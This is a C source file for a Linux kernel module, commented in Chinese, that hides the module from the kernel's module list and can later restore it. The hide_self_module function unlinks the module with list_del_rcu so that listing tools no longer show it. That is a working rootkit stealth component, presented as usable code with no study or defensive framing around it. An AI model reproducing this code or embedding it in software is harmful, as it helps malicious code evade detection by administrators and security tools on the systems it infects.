#include <linux/module.h>
#include <linux/list.h>
#include <linux/rculist.h>
#include <linux/mutex.h>
#include <linux/version.h>

#include "hide_mod.h"

// 仅管理自身模块的隐藏状态：是否隐藏 + 原始链表位置
static struct self_mod_info {
    int is_hidden;                  // 0=未隐藏，1=已隐藏
    struct list_head *orig_prev;    // 自身在模块链表中的原始前节点（用于恢复）
    struct mutex lock;              // 保护自身状态操作的互斥锁
} self_mod = {
    .is_hidden = 0,
    .orig_prev = NULL,
    .lock = __MUTEX_INITIALIZER(self_mod.lock) // 初始化互斥锁
};

/**
 * 隐藏自身模块：从内核模块链表中移除
 * 返回：0=成功，-EEXIST=已隐藏，其他负数=错误
 */
int hide_self_module(void)
{
    // 加锁保护，避免并发操作冲突
    mutex_lock(&self_mod.lock);

    // 已隐藏则直接返回
    if (self_mod.is_hidden) {
        mutex_unlock(&self_mod.lock);
        return -EEXIST;
    }

    // 1. 保存自身在模块链表中的原始前节点（用于后续恢复）
    self_mod.orig_prev = THIS_MODULE->list.prev;

    // 2. RCU安全删除：从内核模块链表中移除自身（避免遍历链表时的竞态）
    list_del_rcu(&THIS_MODULE->list);
    // 等待RCU Grace Period：确保所有CPU都已看到链表删除操作
    synchronize_rcu();

    // 3. 标记为已隐藏
    self_mod.is_hidden = 1;

    mutex_unlock(&self_mod.lock);
    printk(KERN_INFO "[self-mod] Successfully hidden (name: %s)\n", THIS_MODULE->name);
    return 0;
}

/**
 * 恢复自身模块：插回内核模块链表的原始位置
 * 返回：0=成功，-ENOENT=未隐藏，其他负数=错误
 */
int restore_self_module(void)
{
    mutex_lock(&self_mod.lock);

    // 未隐藏则直接返回
    if (!self_mod.is_hidden) {
        mutex_unlock(&self_mod.lock);
        return -ENOENT;
    }

    // 1. RCU安全添加：将自身插回原始链表位置
    list_add_rcu(&THIS_MODULE->list, self_mod.orig_prev);
    synchronize_rcu();

    // 2. 重置隐藏状态和原始位置
    self_mod.is_hidden = 0;
    self_mod.orig_prev = NULL;

    mutex_unlock(&self_mod.lock);
    printk(KERN_INFO "[self-mod] Successfully restored (name: %s)\n", THIS_MODULE->name);
    return 0;
}

/**
 * 模块卸载时清理：确保自身已恢复（避免残留链表异常）
 */
void hide_mod_exit(void)
{
    mutex_lock(&self_mod.lock);

    // 若仍处于隐藏状态，自动恢复
    if (self_mod.is_hidden && self_mod.orig_prev) {
        list_add_rcu(&THIS_MODULE->list, self_mod.orig_prev);
        synchronize_rcu();
        printk(KERN_INFO "[self-mod] Auto-restored on exit (name: %s)\n", THIS_MODULE->name);
        self_mod.is_hidden = 0;
        self_mod.orig_prev = NULL;
    }

    mutex_unlock(&self_mod.lock);
}